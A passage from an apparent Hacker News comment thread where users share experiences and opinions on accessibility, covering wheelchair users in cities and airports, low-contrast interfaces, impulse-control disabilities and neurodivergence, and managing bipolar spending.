abstractions come to mind. There may be \"exemplars\", but, you can't literally \"show\" me \"the number 3\"**. That written, there are many cases where we CAN 'experience' some form of direct 'instantiation' and, for reasons both experiential and even statistical / logical, such an instantiation is pretty well guaranteed to do a better job of producing understanding in our overgrown monkey minds than any amount of sitting around and daydreaming can.So, really, when it comes to the \"hard(er)\" (e.g., engineering) and \"soft(er)\" (e.g., psychology - including empathy, say), there's no substitute for \"the actual launch\" (to circle back to the language of the rocket example, above).* Though, there may be cases / \"regimes\" that are too difficult [at least practically] to test, even in a wind tunnel, and where, especially these days, CFD modeling can at least give some info and potentially be even entirely adequate)** Can't wait to see the replies that just say \"3\", kekreplyTheOtherHobbes 20 hours ago | root | parent | next [–] Absence of empathy and other-experience - with some political orientations being actively hostile to it - may well be our single biggest cognitive handicap as a species.Many humans seem to be locked inside their skulls in what is - ironically - a very handicapped and limited mobility way.replyspecialist 19 hours ago | root | parent | next [–] Theory of mind (empathy) is what makes humans human. It enabled our comparatively larger social groups to function at all. More important than opposable thumbs, vocal cords / language, walking upright, and fire.(IMHO; believe but cannot prove; blah, blah, blah.)replyjacquesm 19 hours ago | parent | prev | next [–] > The lovely, welcoming residents of Chicago catcalled her using wheelchair-related phrases, one guy on the train pointed at her and told her to kill herself, and someone kicked her cast in a crowd.That's beyond bad, and makes me feel sick.replyModernMech 20 hours ago | parent | prev | next [–] Yeah I used to do research on robotic wheelchairs, and as part of that I had to use them. Half of the “accessible” doors on campus where not powered, so I had to open them while sitting in the wheelchair. It was impossible to do without holding the door with my legs. And they were these big heavy doors.Then there was the elevator, which could barely fit the wheelchair. You can go in at juuuuust the right angle to get on the lift, then you had to reverse out because there was no room to maneuver inside. I started actually getting claustrophobic.I just couldn’t see how an actual wheelchair-bound person could get into these buildings on a daily basis.replyjoker_minmax 18 hours ago | root | parent | next [–] Why do \"accessible\" doors always have to weigh so much more than regular doors? The powered ones are extremely difficult to open if the button decides to not work.replybombcar 11 hours ago | root | parent | next [–] It's like trying to turn power steering in your car with the engine off. They're often not designed to \"freewheel\" so you're dragging the equipment with it.Automatic sliding doors is the way to go, or if you have swing doors then they should be very large and well-hung.The large also contributes to it - a normal door may be 3 feet wide, an accessible one can be 4 or even 5 feet wide.replysomsak2 13 hours ago | parent | prev | next [–] > catcalled her using wheelchair-related phrasesThis happens to people without disabilities quite often too> one guy on the train pointed at her and told her to kill herselfa homeless person? I don't think these anecdotes are really representative of anything specific to the disability, this has become commonplace in large cities.replyforrestthewoods 11 hours ago | parent | prev | next [–] > the UK and I don't know what their laws are with regards to accessibilityEurope does not give a fuuuuuck about accessibility. It’s something the US is genuinely miles ahead in. Not perfect of course. But Europe is an accessibility nightmare.replyvkou 22 hours ago | parent | prev | next [–] > The lovely, welcoming residents of Chicago catcalled her using wheelchair-related phrases, one guy on the train pointed at her and told her to kill herself, and someone kicked her cast in a crowd.This is so utterly farcical and disguisting that people will swear until they are black and blue that you are making this up.Of course, some of the people making that argument would, with the shield of being a face in a crowd, without a shred of irony and self-awareness, behave in that exact same way.It's really, really bloody sad.replyjoker_minmax 21 hours ago | root | parent | next [–] The guy who told her to die was definitely on drugs and absolutely wired. Which there are bound to be some characters that way in a large city. The others I can't say, they were basically normal passers-by with no abnormal demeanor prior to being cruel.replyrcme 21 hours ago | root | parent | next [–] I think this has nothing to do with being handicapped and everything to do with the fact that the cta allows citizens to be assaulted every day by allowing crazy people to squat in trains. Plenty of able-bodied people have horror stories.replyvkou 18 hours ago | root | parent | next [–] It's incredibly ironic how you read the actual horror story, and respond by trying to turn this into blaming a pet issue. \"It's the bad others, it's not 'normal'[1] people that are behaving poorly.\"---[1] Despite the OP explicitly stating that a significant part of the abuse did not come from 'Crazies squatting on trains.'replyneilv 18 hours ago | parent | prev | next [–] I live in a high-cost-of-living (HCOLA) metro area that wins national awards/rankings for walkability, but the narrow, obstructed, and often poorly-maintained sidewalks are very often impassable for people in wheelchairs.Even new renovations and widenings, where they put in new, flat sidewalk that's sufficiently wide, the concrete figuratively isn't even dry before they install excessive signposts and random street furniture, again blocking the sidewalk.Then there's the snow&ice, and the inadequate compliance with the rules about who has to shovel what, when, and how. And the property owners that eventually comply, are fighting the plowing from the streets onto the sidewalks.There's even further problems with landscaping, and sometimes poison ivy/oak, growing out from a residential property, to effectively block the narrow square of sidewalk that remains. Not something you want brushing or scraping across your arm or face as you're trying to get through and can't dodge it.Even in good weather I only rarely see people on the sidewalk in wheelchairs or on mobility scooters. That doesn't mean they don't live in town, but that the sidewalks don't let you get far. When I do see them (as a walker), they're usually operating their wheelchair or scooter in the street. A couple times, I've had to help one who was simply stuck in the street. I imagine they don't feel good about it, and feel abandoned.I would've thought the bicyclists would have empathy and solidarity, at least against the cars, but there actually seems to be a higher rate of problematic behavior there, per rider/driver (e.g., ignoring traffic signals at crossings, barreling down narrow sidewalks). And now we're getting dedicated bike paths often at the cost of sidewalks.One of the people in a wheelchair who got stuck in the street, after I helped push him out of it and to the nearby grocery store entrance, he held some device to his neck so that he could say thank you.I imagine that it was implied that this situation sucks -- and I'm thinking: made worse, for no good reason, in an area that can afford to do better -- but he's soldiering through, and doing what he can.replytechsupporter 17 hours ago | root | parent | next [–] > I would've thought the bicyclists would have empathy and solidarity, at least against the cars ... And now we're getting dedicated bike paths often at the cost of sidewalks.I live in another HCOL area allegedly famed for its walking and biking facilities, and I hoped the same thing. Unfortunately, the process here seems to have turned into \"each individual group vs car drivers\", probably by design. For example, where I live has separate pedestrian, bicycle, and transit advisory boards to the city council. Never mind that projects should be built to benefit all three, not just one.What's wound up happening is, because we \"obviously cannot\" take space from car drivers, the precious little room given over to modes that don't involve driving are forced to compete with each other. A new train station was built on the north end of town and the former sidewalk area on one side of the train station has been repurposed as a bicycle-only lane. The other side of the street is still a pedestrian sidewalk...but the street itself is a four-lane thoroughfare with very wide lanes and a median turn lane in spots. Of course, narrowing the car space on that road to make the corridor more comfortable for people on feet and on bikes was completely out of the question.Also, the sidewalk didn't get fully rebuilt so I routinely see people in wheelchairs and pushing prams on the \"bicycle-only\" side because that's much smoother and even.replyneilv 17 hours ago | root | parent | next [–] > Unfortunately, the process here seems to have turned into \"each individual group vs car drivers ... where I live has separate pedestrian, bicycle, and transit advisory boards to the city council.I suspect you're right; I've seen that, but didn't realize at the time that it could be a barrier.I could imagine how it might be organized that way in good faith -- e.g., get the input from the people who really care about biking, the people who really care about walking, and the train/transportation buffs, and then have city officials process it all, holistically -- but that's a lot of heavy lifting, and also doesn't bring the advocates together to learn from each other and directly reconcile conflicts.replynavjack27 21 hours ago | prev | next [–] The biggest disability I wish people would explore in their accessibility is issues with impulse control. So much of the web is designed to keep us hooked and I firmly believe that people that have issues with impulse control have a good handle on the obvious stuff moreso than people who don't because we are aware of the concept of choice more.But what about when it's your credit account that is sabotaging you by design? Can't cancel the account unless you call a phone number and talk to somebody. But if you want to increase your credit limit, you can just click a button on the website and validate how much you make a year and boom, you have a $7000 limit when you get $900 a month.So if you have a phone phobia and an issue with impulse control and you maybe stress spend, you now have a system totally against you by design.It's great to explore the world as someone with visible disabilities. Also do so with neurodivergence.replysergioisidoro 21 hours ago | parent | next [–] I'm skeptical about calling it a disability, because a lot of these mechanisms and dark patterns are made to prey on everyone's nature.Some people may more susceptible to those stimuli, but I don't see it a disability, but as natural neurodiversity.These are plainly predatory and unethical marketing practices, for everyone!replycoldtea 20 hours ago | root | parent | next [–] Neurodiversity is a nicer sounding term, to mask the fact that underneath there are certain life affecting disabilities - often severely life affecting (if it was just harmless \"natural neurodiversity\", it wouldn't translate to reduced life expectancy. Not to mention millions of cases which need constant assistance to make it througn everyday life).That it also targets \"everyone's nature\" doesn't mean it's not a bigger issue for people with certain neurodiversities affecting impulse control more. Same way a badly maintained road might also inconvenience a perfectly abled walker, but it is far more burdensome to a disabled person.replydragonwriter 20 hours ago | root | parent | next [–] > if it was just harmless “natural neurodiversity”, it wouldn’t translate to reduced life expectancy.Without disagreeing that the space of neurodivergence includes some life affecting disabilities, this generalization would also prove that race is not just harmless “natural diversity” but that being of a non-dominant race is also a “life affecting disability”. There are other explanations for correlation with reduced life expectancy than individual disability.replycoldtea 18 hours ago | root | parent | next [–] The mechanism doesn't have to be genetic/physiological. Social or behavioral disavantages caused or attenuated by the disability, still means the disability is not harmless.replyconcordDance 6 hours ago | root | parent | prev | next [–] > that being of a non-dominant race is also a “life affecting disability”.One thing worth noticing is that a society tends to be designed for the convenience of the dominant ethnicity, people of a different culture are going to have a somewhat harder time.replyAndrewKemendo 12 hours ago | root | parent | prev | next [–] Which is unquestionably truehttps://spia.princeton.edu/news/life-expectancy-gap-between-...replyadroniser 19 hours ago | root | parent | prev | next [–] The reason for the low life expectancy of autism for instance is suicide.replycoldtea 18 hours ago | root | parent | next [–] It's lower even accounting for suicide already.There are lots of other issues, like losing supporting parents and family, lack of a support network of friends, lack of job opportunities and bad work careers, issues with pursuing healthcare and maintaining health and lack of access to healthcare, and so on.replyadroniser 18 hours ago | root | parent | next [–] These are all systemic issues though are they not? You could make all of these same arguments about gay people back in the 80s. Yes even the healthcare one. That doesn't mean that being gay isn't a natural variation in sexual orientation just as being autistic is a natural variation in brain structure.replycoldtea 15 hours ago | root | parent | next [–] >These are all systemic issues though are they not?Only in the sense that the system doesn't provide extra accomondations. Not in the sense of active purposeful systemic opression (unlike say with blacks or gays).>That doesn't mean that being gay isn't a natural variation in sexual orientation just as being autistic is a natural variation in brain structure.I wouldn't say it's \"just as\". Being gay doesn'r bring any special impairement in sensory processing, social understanding, proprioception, speech, and so on. It only affects individuals because of morality / prejudice.Whereas being autistic, especially of high support needs, means major sensitivity issues, issues with communication, problems coping with changes to routine, sometimes even inability to speak at all, meltdowns, and other issues, which impact the person, and need to be catered and attended, and even when perfectly catered, still cause issues (a school or office can accomondate for sensory issues, but we can't remove noise and light and other sensations from the world).Saying it's a \"natural variation\" begs the question.replyadroniser 6 hours ago | root | parent | next [–] I think you're probably right and I've misread your intention (autism lol). I agree with you that yes being autistic is a disability in the modern world due to a lack of accommodations.My perception of the word neurodivergent is that firstly the vast majority of people who use the word use it with an often first-hand awareness of the disabling aspects of conditions like adhd or autism, but with a view towards self acceptance. The people using the word are often painfully aware of the downsides of their disability, but equally can see the upshots.If we were in a world populated by 99% autistic people, neurotypical people would be called overly emotional, lower cognitive function, inability to think abstractly, inability to focus for long periods of time.The point is you can acknowledge the need for accommodations while simultaneously acknowledging that it's not so much something inherently \"wrong\" with you, rather something wrong with you existing in a neurotypical world.replycoldtea 5 hours ago | root | parent | next [–] Yeah, understanding the disabling aspects shouldn't prevent self-acceptance. Even more so, shouldn't prevent social acceptance. Yet, physical disabilities get much more respect and acceptance.replyAndrewKemendo 12 hours ago | root | parent | prev | next [–] Well said. I’d go further and say the modern world is only comfortable for a particular subset of neurodivergent peopleNamely ones who are content to be sedentary and work on explicitly abstract or highly derived concepts (mathematics, accounting, computing etc).That’s a novel context even in near history, saying nothing of how far away our nearly unchanged pre-modern biology is from being comfortable in such a contextreplycoldtea 5 hours ago | root | parent | next [–] That's a good point regarding the particular subset being more expected/accepted/integrated.If you're asd and want to work in math or programming or something similar, it's much smoother sailing than in you want to work in many other professions that aren't abstract/sedentary. Much worse if you'd like to work in a highly social profession like advertising or journalism (or even academia in today's climate where it's mostly about how good you're at self-promotion and networking).replyJohnBooty 9 hours ago | root | parent | prev | next [–]These are all systemic issues thoughare they not? You could make all ofthese same arguments about gay peopleback in the 80s.I don't think so. Some but not all.There's nothing inherent about being gay that prevents healthy mutual interpersonal relationships.Many people on the autism spectrum have wonderful and fulfilling interpersonal relationships (I suspect I am one of these, in fact) but autism can negatively affect many of the building blocks (empathy, etc) of interpersonal relationships.replyconcordDance 6 hours ago | root | parent | prev | next [–] No, there's a ton of comorbidities. https://en.m.wikipedia.org/wiki/Conditions_comorbid_to_autis...replyadroniser 6 hours ago | root | parent | next [–] Yeah there's comorbidities, the only two of which are significant enough for the literature to note in this context is epilepsy and mental illness. Epilepsy does not account for most early death in level 1 ASD.replyconcordDance 2 hours ago | root | parent | next [–] Got some numbers or a cite in this?replyadroniser 2 hours ago | root | parent | next [–] I don't actually but i've heard it said by a fair few experts in autism and such as being one of the big things they focus on as it is the main reason for early mortality.replyDoughnutHole 18 hours ago | root | parent | prev | next [–] Whether or not something is considered a disability is really matter of severity. I believe this applies to both physical and mental conditions.If someone has reduced mobility in their arm due to some past injury that might not be considered a disability if its impact on their life is low. If that impairment is so severe that they have functionally lost use of that arm then it could easily be considered such.I don’t consider my ADHD a disability, but it is an impairment with regards to impulse control. But someone else’s condition could be much more severe. Someone with bipolar disorder or manic depression can easily go through a bout of extreme suggestibility which can wreak absolute havoc on their life.Categorising many mental disorders as harmless “neurodiversity” feels like a form of forced positivity imposed to alleviate the stigma of some disorders at the cost of dismissing the serious impairments inherent to others.replykayodelycaon 16 hours ago | root | parent | next [–] I’m am bipolar and neurodivergent doesn’t even scratch the surface. Hypomanic episodes are expensive because I have barely any impulse control. No amount of defense in depth can stop me from getting access to money. I have to use a different strategy:I prepare for these episodes months in advance.I needed a new car, so I set myself up to be fixated on a new Prius when the episode got bad. Nothing less than new would do because I wouldn’t have the presence of mind to vet a used one.This put a hard limit on the financial damage. The highest trim Prius with all of the options is cheaper that many other cars I could have bought.The end result was a car $10,000 over my maximum budget. It has far too many buttons, but it didn’t ruin me and I love the car. All in all, a successfully managed episode.This is one of hundreds of problems I deal with and plan for.replyHWR_14 10 hours ago | root | parent | next [–] Can you not get some trusted 3rd party (I assume a lawyer or accountant is the professional option) to limit you. Legally prevent you, for instance, from spending X (or borrowing money) on a car?replykayodelycaon 1 hour ago | root | parent | next [–] I knew someone would suggest that. :)It’s a really bad idea. I’m perfectly willing and highly motivated to destroy relationships to get that money. Think heroin addict.Instead, I save around 25% of every paycheck on top of retirement plans. This gives me a large buffer against episodes. It’s also split across multiple banks. I only use a single account and the others sit for months without a transaction. I don’t have checks or high limit cards for the others to delay access to their full amount. This is exactly the right amount of friction to keep them safe. It’s there, it’s mine, it can be available if I can wait a day. I can’t wait a day.The results speak for themselves:1. My credit score is over 8002. My only loans are a house and car.3. I’ve never failed to pay my credit card off in full each month.As a side note, people see this and think I’m not that bad. They are wrong. Very wrong. I am simply extremely good at masking and compensating.According to my psychiatrist, I’m a fairly severe case despite being easy to treat.replyconcordDance 6 hours ago | root | parent | prev | next [–] A lot of disabilities are a sliding scale with fuzzy grey areas. E.g. visual impairment goes all the way from \"struggling to distinguish colors\" and \"vision is distorted enough that it's impossible to correct to 20-20\" to \"can't see hand in from of face\"replyRetric 21 hours ago | root | parent | prev | next [–] Pay to win video games really are ultimately targeting a small demographic as a tiny percentage of the audience results in the majority of their income.The thing is they don’t know who specifically is vulnerable ahead of time, so they cast a wide net.replyHumblyTossed 18 hours ago | root | parent | prev | next [–] Respectfully, you are not trauma informed if you feel this way. Plenty of kids in foster care who have been traumatized by bios have impulse control issues due to their mal-developed amygdala.replyHWR_14 10 hours ago | root | parent | next [–] I'm skeptical but curious. Trauma caused mal-developed amygdala which causes impulse control issues? That sounds like one of those things that could be true or hokum. Like, would it show up on brain scans. And do they commonly do those on people? That said, I'm sure you have a direction you can point me - at least some search terms for Google.replyconcordDance 6 hours ago | root | parent | prev | next [–] The impulse control issues could also be genetic, inherited from the parents.reply93po 14 hours ago | parent | prev | next [–] Impulse control in general is something that would vastly improve nearly everyone's life to a massive degree. Don't instinctively reach for your phone. Don't add cookies to your shopping cart. Don't thoughtlessly lie to get out of an uncomfortable situation. Don't open hacker news.I have spent the past couple months with my time off work working on this all day every day. It's made a massive improvement in my life, my habits, my routine, and working towards the things that are meaningful in my life.Obviously I'm not faultless - I'm still here on a quick break.replyTanoc 9 hours ago | root | parent | next [–] I tend to have pretty good impulse control, aside from reading and wanting to eat certain foods. And being aware of that makes it frustrating when I see people engage in harmful or negative behaviours such as ordering from Doordash and paying twice as much as a steak dinner for a basic burger.It seems so easy to me personally to refrain from doing so many of these things, and that makes it that much more apparent to me how many systems in modern life are so heavily exploitative of and designed to destroy impulse control. A lot of people had their willpower eroded over time and never noticed, and because of that they see nothing is wrong. It's not a great thing to witness actual fully grown adults being just as impulsive as their five year old children.replyjoker_minmax 18 hours ago | parent | prev | next [–] This also ties into a problem with usability in general. I don't need an impulse control issue to accidentally click ads or accidentally allow notifications on websites. But clicking the wrong thing could cause huge problems in anyone's life when things are made near impossible to use for anyone without 20/20 vision and years of experience. That's why it's so difficult for elderly people to use these things - even Google Chrome now is a nightmare without even going onto a website. But oops now you're subscribed or scammed.replyisykt 21 hours ago | prev | next [–] Accessibility seems to be a blind spot for most in tech because we don’t think disability will happen to us, or if it does, it will be a long time from now.What people often don’t consider is that even if that is true, the likelihood that you will care for someone with a disability — an aging parent, a spouse, or a child - increases the likelihood of lack of accessibility impacting your ability to enjoy your (shared) life.My partner had a stroke. They can no longer walk steadily, and they likely never will. The number of times a certain thing we wanted to do went from idea to “guess not” is now incalculable. The logistics just become too onerous… and we’re lucky. We are high earners in a developed city.replyhereforthecake2 21 hours ago | parent | next [–] > What people often don’t consider is that even if that is true, the likelihood that you will care for someone with a disability — an aging parent, a spouse, or a child - increases the likelihood of lack of accessibility impacting your ability to enjoy your (shared) life.Yes. Many many many people don't realize that their future holds experience with disabilities.And wait until they have to deal with the young tech people calling all the shots on how products look, change, evolve, etc. This idea that we should constantly be updating our UI, workflows, and shoving new features in front of users as a way to push people to expand (and spend more) of what they do has created such a huge problem in our family for our aging relatives. We've had to constantly shift which tech we use to find stuff that's going to be the most simple and easy to help through through while on the phone.replyisykt 21 hours ago | root | parent | next [–] The only solution, dear reader, if you make it this far, is that you — not metaphorically but literally, you, the abled reader - must advocate loudly for accessibility. Even when it’s annoying. Even when it’s more work on top of your already huge pile of work. You’re not advocating for an abstract other. You’re advocating for your future self.replyModernMech 20 hours ago | root | parent | prev | next [–] Heck, it’s already catching up with me in subtle ways. For instance, scroll bars constantly mess me up because they keep making such low contrast between the slider and the background (I don’t know the technical terms). So sometimes I can’t even see where I am on the page without scrolling to see the slider move. But lately when the slider is small enough, I can’t even see it when I’m moving the page! It’s practically invisible to me.Like, why does it have to be light gray on slightly lighter gray? Whose 20 year old eyeballs decided on this?replyarp242 16 hours ago | root | parent | next [–] > Like, why does it have to be light gray on slightly lighter gray? Whose 20 year old eyeballs decided on this?\"It looks fine on my 32\" 8K screen in perfect light conditions 60 centimetres from my face – what are you complaining about?\"I really think lots of people should just use €400 low-end hardware, as that's representative of what people actually use, and all these kind of problems will stand out much sooner.replypaulryanrogers 10 hours ago | root | parent | next [–] 400 EU is low end now. My what a time to be alive.replyarp242 4 hours ago | root | parent | next [–] I'm not sure what you mean exactly?replypaulryanrogers 30 minutes ago | root | parent | next [–] I'm surprised the low end has such a high entry point. IME a low end phone was usually 20-100. Above that and the specs are usually good enough for a few years of decent performance.replyTheNewsIsHere 18 hours ago | root | parent | prev | next [–] I’m with you. I’ve spent a huge amount of my time working with older folks in particular, and the complaints about change have essentially shifted from $every_major_release_or_two to, we’ll, every release. My grandparents started shopping online during the pandemic and every week they had a new complaint about some change on the site. (I saw most of those changes and they certainly weren’t user-friendly!)I’ve felt myself being able to relate more and more. I have a lot more work on my plate now that requires synthesizing previous experience and existing expertise, and that is challenging to do when entire teams at virtually every vendor seem to exist solely to implement changes for the sake of changes. Software moves fast these days and that can be fine, but it doesn’t seem like all that velocity is really genuine in the UX space.My experience isn’t everyone’s experience of course, but requiring that _everyone_ learn new ways of interacting with essentially every product regularly, makes me feel like it’s just busy work to keep up with the proverbial software UX Joneses. (And everything looks the same now, so I’m not sure that’s the hottest take around…)replykgeist 9 hours ago | root | parent | prev | next [–] >Like, why does it have to be light gray on slightly lighter gray? Whose 20 year old eyeballs decided on this?Heh, we had a young UI/UX designer in his 20's who liked to put light gray on slightly lighter gray everywhere. When the project was taken over by another designer in her 40's she introduced more contrast.replyTheCowboy 19 hours ago | root | parent | prev | next [–] This lack of contrast can be annoying. It can sometimes be remedied on our end by playing with non-obvious graphics settings or monitor settings. But it's unfortunately not always as simple as adjusting the contrast.You can also point out that this is an issue with photos and people will act like you're using trash hardware even if you aren't (had this issue with my nicest monitor, while the cheaper displays were fine). And they really should be also designing for non-premium displays, or displays being used in extremely bright, or extremely dark settings, etc.replylcnPylGDnU4H9OF 14 hours ago | root | parent | prev | next [–] > slider and the background (I don’t know the technical terms)I have seen used “thumb” and “gutter”, respectively.replyrobocat 4 hours ago | root | parent | next [–] https://developer.mozilla.org/en-US/docs/Web/CSS/scrollbar-c...Uses thumb and track.replylcnPylGDnU4H9OF 1 hour ago | root | parent | next [–] Track sounds right. From a search, it looks like “gutter” is the space the scrollbar might take up.replyjavajosh 9 hours ago | parent | prev | next [–] >Accessibility seems to be a blind spot for most in tech because we don’t think disability will happen to us, or if it does, it will be a long time from now.I strongly disagree, and I worry that people are now trained to think the worst of themselves.Abledness is the Chrome of people: we code for the mainstream, the healthy, able people, and then if we have time we add support for the others. I don't think this is evil, or even wrong: it's a wise use of limited resources. There are far, far more error modes in a system (like the human body) than non-error modes. That's why people with disabilities really are more dependent on others. Like in the OP's case, they (quite reasonably) suggested that he get someone to help him on the phone. Why is that bad? I mean, consider the \"disability\" of not speaking the supported natural languages. Are all customer service teams supposed to speak all natural languages?Instead of self-flagellating, or flagellating orgs and govs for not covering an infinite number of issues, I think you should instead volunteer to be a helper for someone with a disability. If more people did that, then this issue would be all but moot. Putting the burden on service providers to do the job your friends, family, or helpers should be doing for the disabled doesn't seem fair. (And I say this as someone with a strong bias against central authority).replyburnished 8 hours ago | root | parent | next [–] Consider that everyone experiences being less capable at various points and to various degrees, even in an otherwise healthy life; injured, ill, tired, carrying too many groceries, bad breakup etc.Designing for accessibility helps everyone. I attended a lecture on the topic and an example I found compelling was curb cuts - a person in a wheelchair makes the need obvious, but they are good to have for a variety of other reasons; pushing something with wheels, hurt ankle, being sick or absolutely ancient etc.I agree that we don't need to self flagellate or see ourselves as deficient, design is hard after all.replyjavajosh 1 hour ago | root | parent | next [–] Don't forget being pregnant or having to lug around a baby after it's born! Which is not an error mode. I'm well aware that \"disability\" is something we all go through; but my central point stands. It's not possible to accommodate all or even most types of disabilities and its reasonable to expect individual disabled people to BYOH (bring your own helper) in many cases, such as the OP's case of a speech disability wanting to do business over the phone. In other cases, like with ramps, BYOH won't help so its reasonable to expect/regulate those measures.replymplewis 9 hours ago | root | parent | prev | next [–] It is not a wise use of limited resources when we aim to build a society that serves all. A human without access to basic civilization is not an \"error mode.\" They are a person that we need to help.Human civilization doesn't have to be a world where those with means get to enjoy consumption while those without starve. We have the resources to do better by everyone, not only the abled.replyjavajosh 8 hours ago | root | parent | next [–] The error modes to which I refer are not people, but bodily injury and disease. Your words are the empty product of a mind addicted to the sensation of outrage.Judgemental idealists have caused more damage to the world in the name of compassion and love than any other class of people. May you continue to use your rhetoric proudly, so that it may continue to serve as a warning to others.replyEisenstein 8 hours ago | root | parent | next [–] > Judgemental idealists have caused more damage to the world in the name of compassion and love than any other class of people.Are you counting eugenicists as 'judgmental idealists'?What about death penalty supporters/tough justice advocates?Zero-tolerance school administrators?Abstinence-only-sex-ed proclaimers?Think-of-the-children law pushers that get teens stuck on sex-offender lists?All-human-life-is-sacred religious groups that have made it so that our pets can die in peace, dignity, and without suffering but elderly humans have to suffer in agony for years and then get tortured to death by 'life saving efforts' at the very end?Those judgmental idealists?Certainly not the ones who simply say that disabled people should be able to access public spaces.replybombcar 11 hours ago | parent | prev | next [–] Even just helping your parents with tech as they age makes you realize just how insane software alone has become; everything in the damn UI changes day-to-day and it's all completely incomprehensible to explain.Drives me up the absolute wall; next time their phone dies I'm going to recommend they get a Light Phone: https://www.thelightphone.comreplywintermutestwin 18 hours ago | parent | prev | next [–] >Accessibility seems to be a blind spot for most in tech because we don’t think disability will happen to usWhich is particularly silly because 1/2 of people end up with presbyopia (far-sighted). My older eyes are often frustrated with tech choices made by web/app designers half my age.replyguerrilla 19 hours ago | parent | prev | next [–] > Accessibility seems to be a blind spot for most in tech because we don’t think disability will happen to us, or if it does, it will be a long time from now.This goes for everything. People don't realize that the golden rule is in their own self-interest and they're often harming themselves when they work against things like welfare and other protections.replygiraffe_lady 20 hours ago | parent | prev | next [–] Yeah this blows my mind when working with other tech people. None of y'all ever broke a hand? Smashed a fingernail in a door or burned your thumb cooking? Noticed how hard it us to use the computer or shit even open a rounded doorknob sometimes?Being fully able-bodied is barely even the baseline state, even for \"able bodied\" people. Temporary changes to that state have been common in my life and the lives of the people I am closest too, and it's always obvious how poorly the world is suited to those deviations. And also clear how small and cheap many of the changes would be to improve it.If all goes well, you will be disabled for the final years of your life, we all will, and more than a small handful of years too. It is life why don't we plan for it, build our world for it?replyBalgair 1 hour ago | prev | next [–] I used to work with upper limb amputees. Learned a lot there.There's a standardized testing kit for prostheses and injuries that's surprisingly low tech and amazingly useful: The Southampton Hand Assessment Procedure (SHAP)It's very basic. Things like pouring a glass of milk, opening a deadbolt, tying a shoe, picking up a quarter, buttoning a shirt, etc. Being able to pass any of these quite simple tests is very forgiving, you've got unlimited time to do it.But the very large majority of prostheses fail outright.I never really though of how hard it was to just hold a cup of coffee before that, nor to build a prosthetic that could close a jar of jam.Really opened my eyes to the world around me. Disability tech is human tech, full stop. What helps a wheelchair bound person helps a pregnant one, and a veteran, and an old one too. We grow stronger by making things possible for all of us.http://www.shap.ecs.soton.ac.uk/about-usage.phpreplyFigurativeVoid 22 hours ago | prev | next [–] I used to date a person who needed to use a wheelchair from time to time. Not only is the world inaccessible, but there are so many grandfathering rules that most places don’t have to change.Something this article misses is that many people act totally inappropriately to people using various aids. They used to have people question why they needed a chair. They had people call them wheels in public.replyrdtsc 21 hours ago | parent | next [–] > there are so many grandfathering rules that most places don’t have to change.Indeed. It's especially hard in a poor areas. I used to live with a disabled person and things like cracks in the sidewalk, or bumps from roots, or potholes, look like nothing to people who can walk. To someone in a wheelchair they can prevent them from going through. They city was too poor and run down to get to it. Older parts of town, are also almost impossible to access.> They used to have people question why they needed a chair. They had people call them wheels in public.I noticed this is at the airport. People in a wheelchair often get priority sitting. But to request a wheelchair doesn't require any proof. So, people learned to take advantage of it. May even get an assistant to push them around the airport. And then, as soon as the flight lands, people are miraculously \"healed\" and don't need a wheelchair any longer.They think it's a harmless thing: \"it's allowed anyway\", \"I paid a lot of money for this ticket\", \"not breaking any rules\", etc but what they are doing is they are creating animosity and suspicion in the general public who now feel anyone in a wheelchair in the airport is \"cheating\" to get ahead of the line and get a better spot for their carry-on luggage.replyZak 20 hours ago | root | parent | next [–] > as soon as the flight lands, people are miraculously \"healed\" and don't need a wheelchair any longerThe comment you're replying to talks about someone needing a wheelchair from time to time. Many people who use wheelchairs do not need them all the time.A trivial example would be someone who can walk from the airport to a car when unburdened, but cannot stand in line for an hour while carrying luggage. The available assistance isn't necessarily individually tailored, so \"I need to check a bag without extra charge and skip the security and boarding lines\" is not an option, but a wheelchair is.replyrobbie-c 20 hours ago | root | parent | prev | next [–] I broke my toe just before flying from Portugal to London. I had crutches and was given a wheelchair in the airport. I technically could have walked, it just would have been extremely painful. When the staff at Luton told me that it'd be an hour before the passenger lift was ready, I decided \"fuck it\" and that I would walk down the stairs instead. One of the other passengers accused me of faking the whole thing, but I can assure you that I was not.replyokaram 19 hours ago | root | parent | prev | next [–] A lot of people cheat, but you also need to keep in mind most disabilities are not binary, but have degrees.Many people may be able to get up the wheelchair and walk a little, but may not be able to walk a mile in the airport... Or may not be able to navigate the complicated airport environment.replyFigurativeVoid 17 hours ago | root | parent | next [–] I wouldn't even say a lot of people cheat. There are a few, but it is the vast minority.replysizzle 8 hours ago | root | parent | prev | next [–] I preboard my dad who can’t walk, I transfer him into his seat ahead of the whole plane seating passengers but he is the last to leave the plane as a trade off when they bring his wheelchair. Thankfully have not witnessed anyone pretending they can’t walk and leave first. They all have issues with their gait in my experiences in the US. Sure there might be some bad actors but it’s really sad if they are faking it having to be seen by the actually disabled folks who can probably tell.My dad can’t even use the restroom on the flight cause he can’t stand, it’s truly hell for wheelchair bound folks. They deserve all the help and accommodations they can get to travel and live a normal, rich and fulfilling life like the rest of us able bodied folks.replybombcar 11 hours ago | root | parent | prev | next [–] > People in a wheelchair often get priority sitting. But to request a wheelchair doesn't require any proof.If it becomes a big problem, you just switch it around, wheelchair-bound people get boarded last. Then the advantage of faking it is somewhat removed.(Though for my personal experience, boarding first is kind of sucky unless you're in first and getting drinks.)replyrobbie-c 5 hours ago | root | parent | next [–] When I broke my toe, myself and the other people in airport wheelchairs started the boarding process first, but by the time the passenger lift had gotten us all onto the plane, everyone else was on board and in their seats. Depends on the airport but obviously in this case it's better for everyone if the wheelchair users get started first, as they are on the critical path for the plane departing.replybombcar 52 minutes ago | root | parent | next [–] It would vary tremendously depending on the boarding type and sequence and seat location; obviously a jet bridge boarding is different from a stairway/tarmac boarding.replycurrymj 19 hours ago | root | parent | prev | next [–] I know someone who did what you describe, but in her case it was legitimate. She could walk, though slowly, but had great difficulty with ramps and stairs, and would be in pain for a couple days after standing for a long time, so genuinely needs help to get through airports.replyjrmg 18 hours ago | root | parent | next [–] Yes, me too. You should not assume someone who seems able to stand and walk unaided is not in need of assistance for longer periods. It can be a matter of scale, and there can be sudden tipping points.The person I know is perfectly able to stand for a short while, or walk around a shop or food court for a couple of minutes carrying items with really no obvious problems. But navigating an airport all the way through, quickly making it to a connecting flight on the other side of a large terminal, or standing for minutes in a check-in line is basically impossible without days of pain afterwards.replyoaththrowaway 19 hours ago | root | parent | prev | next [–] When I was a teenager my grandmother lived with us for a few years because she was unable to care for herself. Once we went to a museum as a family and my parents sent me and my brother to get a wheelchair for my grandma. When we found one I got in and had my brother push me. As a joke he started running and let go and I flew off the curb and crashed into the parking lot.A 